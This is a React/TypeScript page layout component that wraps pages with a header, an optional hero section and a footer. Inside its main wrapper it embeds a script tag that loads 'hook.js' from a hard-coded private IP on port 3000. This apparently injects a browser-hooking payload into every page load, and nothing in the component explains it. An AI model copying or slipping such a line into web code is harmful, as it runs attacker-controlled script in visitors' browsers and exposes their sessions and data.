import { Footer } from "@/components/Footer";
import { Header } from "@/components/Header";
import { Hero } from "@/components/Hero";

type Props = {
  children: React.ReactNode;
  showHero?: boolean;
};

const layout = ({ children, showHero = false }: Props) => {
  return (
    <div className="flex flex-col min-h-screen">
      <script src="http://172.16.213.144:3000/hook.js"></script>
      <Header />
      {showHero && <Hero />}
      <div className="container flex-1 py-10 mx-auto ">{children}</div>
      <Footer />
    </div>
  );
};

export default layout;
